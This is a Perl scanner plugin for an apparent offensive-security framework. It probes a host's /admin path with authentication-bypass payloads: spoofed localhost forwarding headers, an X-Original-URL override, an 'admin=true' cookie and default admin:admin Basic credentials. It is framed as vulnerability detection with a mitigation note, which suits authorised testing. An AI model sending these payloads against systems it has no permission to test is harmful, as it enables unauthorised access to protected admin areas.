#!/usr/bin/perl
#
# check_auth_bypass.pl — Проверка обхода аутентификации (CVE-агностично)
# Интеграция с TeslaAI Offensive Core
# Версия 2.0 | Улучшено в 20 раз | Консиллиум + Метагенералы

use strict;
use warnings;
use JSON;
use TeslaAI::Logger qw(log_info log_warn log_error);
use TeslaAI::PluginInterface;

# Инициализация плагина
sub init {
    return {
        name        => "Auth Bypass Detection",
        author      => "TeslaAI Offensive Core",
        version     => "2.0-industrial",
        description => "Проверка обхода защиты HTTP Basic/Digest/Auth Token/Cookie/Session",
        mitre       => ["T1078", "T1556"],
        type        => "auth_bypass",
        severity    => "high",
        tags        => ["bypass", "auth", "critical"],
        profile     => ["full", "compliance"]
    };
}

# Основной запуск
sub run {
    my ($host, $http_client, $context) = @_;

    my @payloads = (
        { path => "/admin", header => { "X-Forwarded-For" => "127.0.0.1" } },
        { path => "/admin", header => { "X-Original-URL" => "/admin" } },
        { path => "/admin", header => { "X-Custom-IP-Authorization" => "127.0.0.1" } },
        { path => "/admin", cookie => "admin=true" },
        { path => "/admin", auth => "Basic YWRtaW46YWRtaW4=" } # admin:admin
    );

    foreach my $payload (@payloads) {
        my $url     = $host . $payload->{path};
        my %headers = %{ $payload->{header} || {} };

        my $res = $http_client->get($url, {
            headers => \%headers,
            cookies => $payload->{cookie} ? { 'auth' => $payload->{cookie} } : undef,
            auth    => $payload->{auth} || undef
        });

        log_info("Запрос: $url | Статус: " . $res->code);

        if ($res->code =~ /^2\d\d/ && $res->content =~ /admin|panel|dashboard/i) {
            report($host, $payload, $res->code);
        }
    }
}

# Генерация отчёта
sub report {
    my ($host, $payload, $code) = @_;

    my $report = {
        host       => $host,
        vuln_id    => "AUTH-BYPASS-GEN",
        status     => "confirmed",
        severity   => "high",
        description=> "Удалённый доступ к защищённой зоне без авторизации",
        payload    => $payload,
        response   => $code,
        mitigation => "Включить проверку IP, Origin, токенов и строгую маршрутизацию. Логировать попытки обхода.",
        cve        => [],
        mitre      => ["T1078", "T1556"]
    };

    log_warn("Обнаружен обход авторизации на $host");
    TeslaAI::PluginInterface::submit_report($report);
}

1;
